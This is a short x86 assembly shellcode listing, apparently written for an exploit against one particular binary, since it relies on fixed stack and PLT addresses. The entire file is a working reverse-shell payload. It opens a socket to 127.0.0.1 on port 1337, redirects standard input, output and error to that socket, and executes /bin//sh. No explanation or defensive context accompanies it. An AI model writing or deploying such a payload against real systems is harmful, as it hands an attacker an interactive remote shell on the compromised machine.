MOV ESP, 0xbfffdd3c;

PUSH 0;             # Protocol.
PUSH 1;             # Type.
PUSH 2;             # Family.
MOV EDI, 0x8048730; # PLT _socket syscall.
CALL EDI;
MOV ESI, EAX;       # Save our socked fd.


MOV ECX, 0x0100007F; # 127.0.0.1 in little endian.
PUSH ECX;            # IP.
XOR EBX, EBX;        # EBX = 0.
MOV BX, 0x3905;      # 0x539 in little endian(port 1337).
PUSH BX;             # Port.
MOV BX, 0x0002;      
PUSH BX;             # Family.
MOV ECX, ESP;
XOR EBX, EBX;
MOV EBX, 16;
PUSH EBX;            # Size if 4 bytes.
PUSH ECX;
PUSH ESI;
MOV EDI, 0x8048750;  # PLT _connect syscall.
CALL EDI;

XOR EBX, EBX;		 # EBX = 0.

PUSH EBX;            # STDIN 0.
PUSH ESI;            # Socket fd.
MOV EDI, 0x8048600;  # PLT _dup2 syscall.
CALL EDI;            # dup2 syscall.
INC EBX;             # EBX = 1.

PUSH EBX;            # STDOUT 1.
PUSH ESI;            # Socket fd.
MOV EDI, 0x8048600;  # PLT _dup2 syscall.
CALL EDI;            # dup2 syscall.
INC EBX;			 # EBX = 2.

PUSH EBX;            # STDERR 2.
PUSH ESI;            # Socket fd.
MOV EDI, 0x8048600;  # PLT _dup2 syscall.
CALL EDI;            # dup2 syscall.

XOR EAX, EAX;
PUSH EAX;            # 0/
PUSH 0x68732f2f;     # hs//
PUSH 0x6e69622f;     # nib//
MOV EBX, ESP;
PUSH EAX;
PUSH EBX;
MOV EDI, 0x80486D0; # PLT _exec syscall.
CALL EDI; 



